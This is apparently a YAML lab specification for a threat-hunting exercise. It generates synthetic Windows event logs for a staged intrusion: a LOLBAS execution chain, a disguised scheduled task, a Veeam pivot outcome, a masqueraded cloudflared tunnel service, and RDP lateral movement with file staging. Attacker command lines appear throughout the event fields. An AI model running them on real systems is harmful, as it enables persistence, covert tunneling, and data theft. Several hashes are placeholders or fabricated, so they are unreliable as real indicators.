@@ -1,0 +1,554 @@
+# ============================================================
+# ArtiForge — Lab Specification
+# UC3: Egg-Cellent Resume
+# LOLBAS + Cloudflared Tunneling + Veeam Pivot
+# Anchor: THE DFIR REPORT · CVE-2023-27532 · MITRE ATT&CK v14
+# ============================================================
+
+lab:
+  id: uc3
+  name: "Egg-Cellent Resume"
+  description: >
+    LOLBAS execution chain (ie4uinit → msxsl → cmd) delivering a resume lure,
+    scheduled-task persistence disguised as a text file, Veeam CVE-2023-27532
+    pivot outcome (new local admin account), Cloudflared tunnel registered as a
+    masqueraded Windows service (egress blocked), and RDP lateral movement to a
+    file-staging workstation.
+  mitre_version: "v14"
+
+# ── Infrastructure ────────────────────────────────────────────────────────────
+infrastructure:
+  domain: lab.local
+  hosts:
+    WIN-WS1:
+      ip: 10.10.10.10
+      fqdn: WIN-WS1.lab.local
+      os: "Windows 10 22H2"
+      sid_prefix: "S-1-5-21-3456789012-2345678901-1234567890"
+      users:
+        - username: marcus.webb
+          domain: LAB
+          rid: 1001
+
+    WIN-WS2:
+      ip: 10.10.10.11
+      fqdn: WIN-WS2.lab.local
+      os: "Windows 10 22H2"
+      sid_prefix: "S-1-5-21-3456789012-2345678901-1111111111"
+      users:
+        - username: svc_backup_admin
+          domain: WIN-WS2
+          rid: 1100
+
+    WIN-DC1:
+      ip: 10.10.10.2
+      fqdn: WIN-DC1.lab.local
+      os: "Windows Server 2019"
+      sid_prefix: "S-1-5-21-3456789012-2345678901-2222222222"
+
+    WIN-BACKUP1:
+      ip: 10.10.10.20
+      fqdn: WIN-BACKUP1.lab.local
+      os: "Windows Server 2019"
+      sid_prefix: "S-1-5-21-3456789012-2345678901-3333333333"
+      users:
+        - username: svc_backup_admin
+          domain: WIN-BACKUP1
+          rid: 1100
+
+# ── Attack specification ───────────────────────────────────────────────────────
+attack:
+  # Base timestamp for the scenario — override with --base-time on CLI
+  base_time: "2026-02-19T09:12:00Z"
+  malicious_account: svc_backup_admin
+
+  phases:
+
+    # ──────────────────────────────────────────────────────────────────────────
+    # PHASE 01 — Initial Access: Resume Lure Execution
+    # T1204.002 · T1566.001 · T1218 · T1218.010
+    # Host: WIN-WS1 · User: marcus.webb · T+0
+    # ──────────────────────────────────────────────────────────────────────────
+    - id: 1
+      name: "Initial Access — Resume Lure"
+      mitre: [T1204.002, T1566.001, T1218, T1218.010]
+      offset_minutes: 0
+      host: WIN-WS1
+      user: marcus.webb
+
+      events:
+        # Sysmon 11 — INF file dropped to %TEMP% by the LNK execution
+        - channel: Sysmon
+          eid: 11
+          offset_seconds: 2
+          fields:
+            Image: 'C:\Windows\System32\cmd.exe'
+            TargetFilename: 'C:\Users\marcus.webb\AppData\Local\Temp\ie4uinit_setup.inf'
+            User: 'LAB\marcus.webb'
+
+        # Sysmon 11 — XSL stylesheet dropped to ProgramData
+        - channel: Sysmon
+          eid: 11
+          offset_seconds: 3
+          fields:
+            Image: 'C:\Windows\System32\cmd.exe'
+            TargetFilename: 'C:\ProgramData\MicrosoftEdgeUpdate\style.xsl'
+            User: 'LAB\marcus.webb'
+
+        # 4688 — ie4uinit.exe spawned by explorer.exe (LOLBIN trigger)
+        - channel: Security
+          eid: 4688
+          offset_seconds: 5
+          fields:
+            SubjectUserName: marcus.webb
+            SubjectDomainName: LAB
+            NewProcessName: 'C:\Windows\System32\ie4uinit.exe'
+            CommandLine: 'C:\Windows\System32\ie4uinit.exe -BaseSettings'
+            ParentProcessName: 'C:\Windows\explorer.exe'
+            TokenElevationType: '%%1938'
+
+        # Sysmon 1 — ie4uinit.exe process creation (full hash + parent)
+        - channel: Sysmon
+          eid: 1
+          offset_seconds: 5
+          fields:
+            Image: 'C:\Windows\System32\ie4uinit.exe'
+            OriginalFileName: 'IE4UINIT.EXE'
+            CommandLine: 'C:\Windows\System32\ie4uinit.exe -BaseSettings'
+            ParentImage: 'C:\Windows\explorer.exe'
+            ParentCommandLine: 'C:\Windows\explorer.exe'
+            User: 'LAB\marcus.webb'
+            IntegrityLevel: Medium
+            Hashes: 'SHA256=B14F8C49BB14C3C2CB6BFF963AED36E0DB98B9CA7E1769BE41C89DA21FB6B74A'
+
+        # 4688 — msxsl.exe spawned by ie4uinit.exe
+        - channel: Security
+          eid: 4688
+          offset_seconds: 8
+          fields:
+            SubjectUserName: marcus.webb
+            SubjectDomainName: LAB
+            NewProcessName: 'C:\Windows\System32\msxsl.exe'
+            CommandLine: 'msxsl.exe C:\ProgramData\MicrosoftEdgeUpdate\style.xsl C:\ProgramData\MicrosoftEdgeUpdate\data.xml'
+            ParentProcessName: 'C:\Windows\System32\ie4uinit.exe'
+
+        # Sysmon 1 — msxsl.exe (key LOLBIN — parent is ie4uinit, never legitimate)
+        - channel: Sysmon
+          eid: 1
+          offset_seconds: 8
+          fields:
+            Image: 'C:\Windows\System32\msxsl.exe'
+            OriginalFileName: 'msxsl.exe'
+            CommandLine: 'msxsl.exe C:\ProgramData\MicrosoftEdgeUpdate\style.xsl C:\ProgramData\MicrosoftEdgeUpdate\data.xml'
+            ParentImage: 'C:\Windows\System32\ie4uinit.exe'
+            ParentCommandLine: 'C:\Windows\System32\ie4uinit.exe -BaseSettings'
+            User: 'LAB\marcus.webb'
+            IntegrityLevel: Medium
+            Hashes: 'SHA256=C2E3A6D1FA0D4A8E2B1F3D9C7E4B5A6F8D2C1E0A9B3F4D5E6C7A8B9D0E1F2A3'
+
+        # 4688 — cmd.exe spawned by msxsl.exe (end of LOLBAS chain)
+        - channel: Security
+          eid: 4688
+          offset_seconds: 10
+          fields:
+            SubjectUserName: marcus.webb
+            SubjectDomainName: LAB
+            NewProcessName: 'C:\Windows\System32\cmd.exe'
+            CommandLine: 'cmd.exe /c whoami && net user'
+            ParentProcessName: 'C:\Windows\System32\msxsl.exe'
+
+        # Sysmon 1 — cmd.exe process
+        - channel: Sysmon
+          eid: 1
+          offset_seconds: 10
+          fields:
+            Image: 'C:\Windows\System32\cmd.exe'
+            OriginalFileName: 'Cmd.Exe'
+            CommandLine: 'cmd.exe /c whoami && net user'
+            ParentImage: 'C:\Windows\System32\msxsl.exe'
+            ParentCommandLine: 'msxsl.exe C:\ProgramData\MicrosoftEdgeUpdate\style.xsl C:\ProgramData\MicrosoftEdgeUpdate\data.xml'
+            User: 'LAB\marcus.webb'
+            IntegrityLevel: Medium
+            Hashes: 'SHA256=975B9D4F0EBF8C4B0E2A6D8C1F3E5A7B9D0C2E4F6A8B0D2E4F6A8B0D2E4F6A8'
+
+      file_artifacts:
+        - type: lnk
+          dest: 'C:\Users\marcus.webb\Desktop\Resume_John_Smith.lnk'
+          lnk_target: 'C:\Windows\System32\ie4uinit.exe'
+          lnk_args: '-BaseSettings'
+
+        - type: inf
+          dest: 'C:\Users\marcus.webb\AppData\Local\Temp\ie4uinit_setup.inf'
+
+        - type: xsl
+          dest: 'C:\ProgramData\MicrosoftEdgeUpdate\style.xsl'
+
+    # ──────────────────────────────────────────────────────────────────────────
+    # PHASE 02 — Persistence: Scheduled Task via XML
+    # T1053.005
+    # Host: WIN-WS1 · User: marcus.webb · T+15m
+    # ──────────────────────────────────────────────────────────────────────────
+    - id: 2
+      name: "Persistence — Scheduled Task via XML"
+      mitre: [T1053.005]
+      offset_minutes: 15
+      host: WIN-WS1
+      user: marcus.webb
+
+      events:
+        # Sysmon 11 — XML task definition written (disguised as .txt)
+        - channel: Sysmon
+          eid: 11
+          offset_seconds: 5
+          fields:
+            Image: 'C:\Windows\System32\cmd.exe'
+            TargetFilename: 'C:\ProgramData\MicrosoftEdgeUpdate\update.txt'
+            User: 'LAB\marcus.webb'
+
+        # 4688 — schtasks /Create /XML (key command line signal)
+        - channel: Security
+          eid: 4688
+          offset_seconds: 8
+          fields:
+            SubjectUserName: marcus.webb
+            SubjectDomainName: LAB
+            NewProcessName: 'C:\Windows\System32\schtasks.exe'
+            CommandLine: 'schtasks /Create /TN "MicrosoftEdgeUpdateTaskMachineUA" /XML C:\ProgramData\MicrosoftEdgeUpdate\update.txt /F'
+            ParentProcessName: 'C:\Windows\System32\cmd.exe'
+
+        # Sysmon 1 — schtasks.exe process (CommandLine contains /XML flag)
+        - channel: Sysmon
+          eid: 1
+          offset_seconds: 8
+          fields:
+            Image: 'C:\Windows\System32\schtasks.exe'
+            OriginalFileName: 'schtasks.exe'
+            CommandLine: 'schtasks /Create /TN "MicrosoftEdgeUpdateTaskMachineUA" /XML C:\ProgramData\MicrosoftEdgeUpdate\update.txt /F'
+            ParentImage: 'C:\Windows\System32\cmd.exe'
+            User: 'LAB\marcus.webb'
+            IntegrityLevel: High
+            Hashes: 'SHA256=1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2'
+
+        # Security 4698 — Scheduled task created (anchor event for hunt task 02)
+        - channel: Security
+          eid: 4698
+          offset_seconds: 9
+          fields:
+            SubjectUserName: marcus.webb
+            SubjectDomainName: LAB
+            TaskName: '\MicrosoftEdgeUpdateTaskMachineUA'
+
+        # Sysmon 13 — Registry key set for scheduled task
+        - channel: Sysmon
+          eid: 13
+          offset_seconds: 10
+          fields:
+            Image: 'C:\Windows\System32\schtasks.exe'
+            TargetObject: 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}\Actions'
+            Details: 'Binary Data'
+            User: 'LAB\marcus.webb'
+
+      file_artifacts:
+        - type: xml_task
+          dest: 'C:\ProgramData\MicrosoftEdgeUpdate\update.txt'
+
+    # ──────────────────────────────────────────────────────────────────────────
+    # PHASE 03 — Veeam Pivot Outcome
+    # T1210 · T1136.001 · T1078
+    # Hosts: WIN-WS1 (recon/network) + WIN-BACKUP1 (account creation)
+    # T+60m
+    # ──────────────────────────────────────────────────────────────────────────
+    - id: 3
+      name: "Veeam Pivot — Credential Extraction Outcome"
+      mitre: [T1210, T1136.001, T1078]
+      offset_minutes: 60
+      host: WIN-WS1
+      user: marcus.webb
+
+      events:
+        # Sysmon 3 — WS1 connects to Veeam TCP 9401 (CVE-2023-27532 attack surface)
+        - channel: Sysmon
+          eid: 3
+          offset_seconds: 0
+          host: WIN-WS1
+          fields:
+            Image: 'C:\Windows\System32\cmd.exe'
+            User: 'LAB\marcus.webb'
+            Protocol: tcp
+            Initiated: 'true'
+            SourceIp: 10.10.10.10
+            SourceHostname: WIN-WS1.lab.local
+            DestinationIp: 10.10.10.20
+            DestinationHostname: WIN-BACKUP1.lab.local
+            DestinationPort: 9401
+            DestinationPortName: '-'
+
+        # 4688 — wmic recon on WS1 (post-pivot enumeration)
+        - channel: Security
+          eid: 4688
+          offset_seconds: 120
+          host: WIN-WS1
+          fields:
+            SubjectUserName: marcus.webb
+            SubjectDomainName: LAB
+            NewProcessName: 'C:\Windows\System32\wbem\wmic.exe'
+            CommandLine: 'wmic /node:10.10.10.20 process list brief'
+            ParentProcessName: 'C:\Windows\System32\cmd.exe'
+
+        # Sysmon 1 — wmic recon process on WS1
+        - channel: Sysmon
+          eid: 1
+          offset_seconds: 120
+          host: WIN-WS1
+          fields:
+            Image: 'C:\Windows\System32\wbem\wmic.exe'
+            CommandLine: 'wmic /node:10.10.10.20 process list brief'
+            ParentImage: 'C:\Windows\System32\cmd.exe'
+            User: 'LAB\marcus.webb'
+            Hashes: 'SHA256=2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3'
+
+        # 4720 — svc_backup_admin account created on WIN-BACKUP1
+        - channel: Security
+          eid: 4720
+          offset_seconds: 180
+          host: WIN-BACKUP1
+          fields:
+            SubjectUserName: SYSTEM
+            SubjectDomainName: NT AUTHORITY
+            TargetUserName: svc_backup_admin
+            TargetDomainName: WIN-BACKUP1
+
+        # 4732 — svc_backup_admin added to Administrators on WIN-BACKUP1
+        - channel: Security
+          eid: 4732
+          offset_seconds: 185
+          host: WIN-BACKUP1
+          fields:
+            SubjectUserName: SYSTEM
+            SubjectDomainName: NT AUTHORITY
+            MemberName: svc_backup_admin
+            TargetUserName: Administrators
+            TargetDomainName: WIN-BACKUP1
+
+        # 4648 — Explicit credentials used from WS1 IP toward BACKUP1
+        - channel: Security
+          eid: 4648
+          offset_seconds: 200
+          host: WIN-BACKUP1
+          user: svc_backup_admin
+          fields:
+            SubjectUserName: marcus.webb
+            SubjectDomainName: LAB
+            TargetUserName: svc_backup_admin
+            TargetDomainName: WIN-BACKUP1
+            TargetServerName: WIN-BACKUP1
+            TargetInfo: WIN-BACKUP1.lab.local
+            ProcessName: 'C:\Windows\System32\wbem\wmic.exe'
+            IpAddress: 10.10.10.10
+            IpPort: '49823'
+
+    # ──────────────────────────────────────────────────────────────────────────
+    # PHASE 04 — Covert C2: Cloudflared Tunnel (blocked)
+    # T1572 · T1543.003 · T1036.004
+    # Host: WIN-WS1 · T+90m
+    # ──────────────────────────────────────────────────────────────────────────
+    - id: 4
+      name: "Covert C2 — Cloudflared Installed as Masqueraded Service"
+      mitre: [T1572, T1543.003, T1036.004]
+      offset_minutes: 90
+      host: WIN-WS1
+      user: marcus.webb
+
+      events:
+        # Sysmon 11 — cloudflared.exe dropped, renamed to update.exe
+        - channel: Sysmon
+          eid: 11
+          offset_seconds: 5
+          fields:
+            Image: 'C:\Windows\System32\cmd.exe'
+            TargetFilename: 'C:\ProgramData\Microsoft\Windows\update.exe'
+            User: 'LAB\marcus.webb'
+
+        # 4688 — sc.exe create (service install command — shows full binPath)
+        - channel: Security
+          eid: 4688
+          offset_seconds: 10
+          fields:
+            SubjectUserName: marcus.webb
+            SubjectDomainName: LAB
+            NewProcessName: 'C:\Windows\System32\sc.exe'
+            CommandLine: 'sc create Wuauserv_Svc binPath= "C:\ProgramData\Microsoft\Windows\update.exe tunnel run --token FAKE_TOKEN" start= auto'
+            ParentProcessName: 'C:\Windows\System32\cmd.exe'
+
+        # Sysmon 1 — sc.exe process (service creation)
+        - channel: Sysmon
+          eid: 1
+          offset_seconds: 10
+          fields:
+            Image: 'C:\Windows\System32\sc.exe'
+            CommandLine: 'sc create Wuauserv_Svc binPath= "C:\ProgramData\Microsoft\Windows\update.exe tunnel run --token FAKE_TOKEN" start= auto'
+            ParentImage: 'C:\Windows\System32\cmd.exe'
+            User: 'LAB\marcus.webb'
+            Hashes: 'SHA256=3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4'
+
+        # System 7045 — Service installed (critical hunt anchor)
+        - channel: System
+          eid: 7045
+          offset_seconds: 12
+          fields:
+            ServiceName: Wuauserv_Svc
+            ImagePath: 'C:\ProgramData\Microsoft\Windows\update.exe tunnel run --token FAKE_TOKEN'
+            ServiceType: 'user mode service'
+            StartType: 'auto start'
+            AccountName: LocalSystem
+
+        # 4688 — sc.exe start
+        - channel: Security
+          eid: 4688
+          offset_seconds: 15
+          fields:
+            SubjectUserName: marcus.webb
+            SubjectDomainName: LAB
+            NewProcessName: 'C:\Windows\System32\sc.exe'
+            CommandLine: 'sc start Wuauserv_Svc'
+            ParentProcessName: 'C:\Windows\System32\cmd.exe'
+
+        # Sysmon 1 — update.exe (cloudflared) process starts
+        - channel: Sysmon
+          eid: 1
+          offset_seconds: 17
+          fields:
+            Image: 'C:\ProgramData\Microsoft\Windows\update.exe'
+            OriginalFileName: 'cloudflared.exe'
+            CommandLine: '"C:\ProgramData\Microsoft\Windows\update.exe" tunnel run --token FAKE_TOKEN'
+            ParentImage: 'C:\Windows\System32\services.exe'
+            User: 'NT AUTHORITY\SYSTEM'
+            IntegrityLevel: System
+            Hashes: 'SHA256=CLOUDFLARED_BINARY_HASH_REPLACE_WITH_REAL'
+
+        # Sysmon 3 — update.exe outbound to argotunnel.com:443 (×5 failed attempts)
+        - channel: Sysmon
+          eid: 3
+          offset_seconds: 20
+          repeat: 5
+          repeat_gap_seconds: 30
+          fields:
+            Image: 'C:\ProgramData\Microsoft\Windows\update.exe'
+            User: 'NT AUTHORITY\SYSTEM'
+            Protocol: tcp
+            Initiated: 'true'
+            SourceIp: 10.10.10.10
+            SourceHostname: WIN-WS1.lab.local
+            DestinationIp: 198.41.192.227
+            DestinationHostname: region2.v2.argotunnel.com
+            DestinationPort: 443
+            DestinationPortName: https
+
+        # Application 1 — Cloudflared startup error in Application log
+        - channel: Application
+          eid: 1
+          offset_seconds: 22
+          fields:
+            Data: >
+              2026-02-19T10:42:22Z ERR Failed to create tunnel
+              error="failed to connect to edge: dial tcp
+              198.41.192.227:443: connect: connection timed out"
+
+      file_artifacts:
+        - type: binary_placeholder
+          dest: 'C:\ProgramData\Microsoft\Windows\update.exe'
+
+    # ──────────────────────────────────────────────────────────────────────────
+    # PHASE 05 — Lateral Movement + File Staging
+    # T1021.001 · T1550.002 · T1560.001
+    # Hosts: WIN-WS1 (source) + WIN-WS2 (target) · T+120m
+    # ──────────────────────────────────────────────────────────────────────────
+    - id: 5
+      name: "Lateral Movement — RDP to WIN-WS2 + File Staging"
+      mitre: [T1021.001, T1550.002, T1560.001]
+      offset_minutes: 120
+      host: WIN-WS1
+      user: marcus.webb
+
+      events:
+        # 4648 — Explicit credentials used on WS1 for RDP to WS2
+        - channel: Security
+          eid: 4648
+          offset_seconds: 0
+          host: WIN-WS1
+          fields:
+            SubjectUserName: marcus.webb
+            SubjectDomainName: LAB
+            TargetUserName: svc_backup_admin
+            TargetDomainName: WIN-WS2
+            TargetServerName: WIN-WS2
+            TargetInfo: WIN-WS2.lab.local
+            ProcessName: 'C:\Windows\System32\mstsc.exe'
+            IpAddress: 10.10.10.10
+            IpPort: '0'
+
+        # 4624 Type 10 — RDP logon by svc_backup_admin on WIN-WS2
+        - channel: Security
+          eid: 4624
+          offset_seconds: 5
+          host: WIN-WS2
+          user: svc_backup_admin
+          fields:
+            TargetUserName: svc_backup_admin
+            TargetDomainName: WIN-WS2
+            LogonType: '10'
+            LogonProcessName: User32
+            AuthenticationPackageName: Negotiate
+            WorkstationName: WIN-WS1
+            IpAddress: 10.10.10.10
+            IpPort: '49843'
+            ProcessName: 'C:\Windows\System32\winlogon.exe'
+
+        # 4688 — Compress-Archive command on WIN-WS2 (file staging)
+        - channel: Security
+          eid: 4688
+          offset_seconds: 120
+          host: WIN-WS2
+          user: svc_backup_admin
+          fields:
+            SubjectUserName: svc_backup_admin
+            SubjectDomainName: WIN-WS2
+            NewProcessName: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+            CommandLine: 'powershell.exe -NoP -EP Bypass Compress-Archive -Path "C:\Users\svc_backup_admin\Documents\SensitiveDocs\*" -DestinationPath "C:\Users\svc_backup_admin\AppData\Local\Temp\docs_2026.zip"'
+            ParentProcessName: 'C:\Windows\System32\cmd.exe'
+
+        # Sysmon 1 — PowerShell process on WS2
+        - channel: Sysmon
+          eid: 1
+          offset_seconds: 120
+          host: WIN-WS2
+          user: svc_backup_admin
+          fields:
+            Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+            CommandLine: 'powershell.exe -NoP -EP Bypass Compress-Archive -Path "C:\Users\svc_backup_admin\Documents\SensitiveDocs\*" -DestinationPath "C:\Users\svc_backup_admin\AppData\Local\Temp\docs_2026.zip"'
+            ParentImage: 'C:\Windows\System32\cmd.exe'
+            User: 'WIN-WS2\svc_backup_admin'
+            IntegrityLevel: High
+            Hashes: 'SHA256=POWERSHELL_HASH_PLACEHOLDER'
+
+        # Sysmon 11 — ZIP file created on WIN-WS2 (staged for exfil)
+        - channel: Sysmon
+          eid: 11
+          offset_seconds: 135
+          host: WIN-WS2
+          user: svc_backup_admin
+          fields:
+            Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+            TargetFilename: 'C:\Users\svc_backup_admin\AppData\Local\Temp\docs_2026.zip'
+            User: 'WIN-WS2\svc_backup_admin'
+
+        # 4634 — RDP session logoff on WIN-WS2
+        - channel: Security
+          eid: 4634
+          offset_seconds: 300
+          host: WIN-WS2
+          user: svc_backup_admin
+          fields:
+            TargetUserName: svc_backup_admin
+            TargetDomainName: WIN-WS2
+            LogonType: '10'
